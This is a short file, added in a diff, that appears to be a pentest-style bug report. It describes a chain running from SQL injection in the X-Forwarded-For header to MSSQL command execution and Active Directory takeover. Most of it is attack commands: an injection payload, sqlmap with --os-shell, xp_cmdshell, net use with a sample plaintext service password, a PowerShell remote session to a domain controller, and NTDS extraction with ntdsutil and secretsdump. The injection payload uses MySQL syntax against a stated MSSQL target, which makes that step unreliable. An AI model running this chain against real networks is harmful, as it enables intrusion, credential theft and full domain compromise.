@@ -1,0 +1,27 @@
+SQL Test Case - 1
+
+**Bug name:SQLi in X-Forwarded-For → MSSQL RCE → AD Takeover**
+This bug is about
+Time-based SQL injection in the X-Forwarded-For header that allows command execution on MSSQL (via xp_cmdshell), theft of service credentials, pivot to internal network and NTDS dump -> full domain compromise.
+
+**Steps to reproduce (very short)**
+1. Detect time-based SQLi in header:
+X-Forwarded-For: 1' IF(1=1, SLEEP(5), 0)-- → ~5s delay confirms.
+
+2. Enumerate DB and user (example):
+sqlmap -u "https://target.local/portal" --headers="X-Forwarded-For: 1*" --current-user
+
+3. Try OS shell:
+sqlmap ... --os-shell → if success run: EXEC xp_cmdshell 'whoami /all';
+
+4. Use found creds to access internal share:
+net use \\fileserver\deploy$ /user:domain\svc_webapp P@ssword!
+
+5. Get interactive DC session:
+Enter-PSSession -ComputerName dc01.domain.local -Credential domain\deploy_admin
+
+6. Dump NTDS on DC and extract hashes:
+ntdsutil "ac i ntds" "ifm" "create full c:\temp\dump" q q
+secretsdump.py -ntds ntds.dit -system system.bak LOCAL
+
+Result: from one header SQLi → MSSQL RCE → creds → DC access → NTDS dump → domain compromise.
